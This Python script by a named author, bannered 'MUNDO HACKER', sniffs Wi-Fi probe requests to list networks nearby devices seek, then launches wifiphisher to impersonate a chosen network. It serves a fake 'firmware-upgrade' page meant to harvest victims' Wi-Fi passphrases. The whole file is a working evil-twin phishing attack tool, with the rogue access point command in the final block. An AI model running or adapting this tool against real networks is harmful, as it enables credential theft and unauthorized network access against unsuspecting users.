#!/usr/bin/env python
# -*- coding: utf-8 -*-​
import os, time, socket, fcntl, struct
from subprocess import call
from platform import system
import threading, os, time
from threading import Thread, Lock
from subprocess import Popen, PIPE
from signal import SIGINT, signal
from scapy.all import *
import os, ConfigParser
from subprocess import Popen, PIPE

# Author: Enrique Serrano ( @EnriqueITE | hello@enriqueite.com )
# define variables
intfparent='wlan1'
intfmon='mon0'
channel=''   ### Define channel if not want to hop, and will stay in one channel
first_pass=1
lock = Lock()
DN = open(os.devnull, 'w')
verbose=0
probes = list() ## list to add station probes
os.system("clear")
enum = 0


print """ 
  ███╗   ███╗██╗   ██╗███╗   ██╗██████╗  ██████╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
  ████╗ ████║██║   ██║████╗  ██║██╔══██╗██╔═══██╗    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
  ██╔████╔██║██║   ██║██╔██╗ ██║██║  ██║██║   ██║    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
  ██║╚██╔╝██║██║   ██║██║╚██╗██║██║  ██║██║   ██║    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
  ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██████╔╝╚██████╔╝    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
  ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝  ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                     
"""
print "      Devices          -                WiFi Networks"
print "-------------------	            ------------------------"


def OScheck():
    osversion = system()
#     print "Operating System: %s" %osversion
    if osversion != 'Linux':
        print "This script only works on Linux OS! Exitting!"
        exit(1)

def InitMon():
	if not os.path.isdir("/sys/class/net/" + intfmon):
		if not os.path.isdir("/sys/class/net/" + intfparent):
			print "WiFi interface %s does not exist! Cannot continue!" %(intfparent)
			exit(1)
		else:
			try:
				# create monitor interface using iw
				os.system("iw dev %s interface add %s type monitor" % (intfparent, intfmon))
				time.sleep(0.5)
				os.system("ifconfig %s up" %intfmon)
 				#print "Creating monitor VAP %s for parent %s..." %(intfmon,intfparent)
			except OSError as e:
				print "Could not create monitor %s" %intfmon
				os.kill(os.getpid(),SIGINT)
				sys.exit(1)
 	else:
 		if verbose: print "Monitor %s exists! Nothing to do, just continuing..." %(intfmon)

def GetMAC(iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15]))
    macaddr = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    return macaddr

def PacketHandler(pkt) :
	global enum
	if pkt.haslayer(Dot11):
		if pkt.type == 0 and pkt.subtype == 4:   ## probe request
			if pkt.info != '':   ## broadcast probe request
				if not pkt.info in probes:
					probes.append(pkt.info)
					print "XX:XX:XX%s 		%s.)    %s" %(pkt.addr2.upper()[8:], enum, pkt.info)
					enum += 1	
def calc_freq(channel):
    if channel == 14:
        freq = 2484
    else:
        freq = 2407 + (channel * 5)
    return str(freq)

def channel_hop(channel=None):
	global intfmon, first_pass
	channelNum=0
	err = None
	while 1:
		if channel:
			with lock: monchannel = channel
		else:
			channelNum +=1
			if channelNum > 14: channelNum = 1
			with lock: first_pass = 0
			with lock: monchannel = str(channelNum)
		try:
			proc = Popen(['iw', 'dev', intfmon, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
			if verbose: print "Setting %s interface to channel: %s (%s MHz)" %(intfmon, monchannel, calc_freq(int(monchannel)))
		except OSError:
			print 'Could not execute iw!'
			os.kill(os.getpid(),SIGINT)
			sys.exit(1)
		for line in proc.communicate()[1].split('\n'):
			if len(line) > 2: # iw dev shouldnt display output unless there's an error
				err = 'Channel hopping failed: '+ line
			if channel:
				time.sleep(.05)
			else:
				if first_pass == 1:
					time.sleep(1.5)
		continue

# Check if OS is linux:
OScheck()

# Check for root privileges
if os.geteuid() != 0:
	exit("You need to be root to run this script!")
# else:
# 	print "You are running this script as root!"

# Check if monitor device exists
InitMon()

# Get intfmon actual MAC address
#macaddr=GetMAC(intfmon).upper()
#print "Actual %s MAC Address: %s" %(intfmon, macaddr)

# Start channel hopping
hop = Thread(target=channel_hop, args=channel)
hop.daemon = True
hop.start()

# Start sniffing with timeout
sniff(iface=intfmon, prn = PacketHandler, timeout=20)
if probes:
	aux = 1
	print "\nSelect a network to continue: \n"
	for i,j in enumerate(probes):
		print str(i) + ".) " + j
	while aux:
		network = raw_input("\n-> ")
		if len(probes) > int(network):
			aux = 0
			ssid = probes[int(network)]
			print "\nOk! Creating Rogue Ap...\n"
			wifiphisherCmd = 'wifiphisher -nJ -e "%s" -T firmware-upgrade' %(ssid)
			os.system(wifiphisherCmd)
		else:
			print "\nWifi network doesn't exists, please select one included in the list."
else:
	print "Wifi probes not found, please try later..."


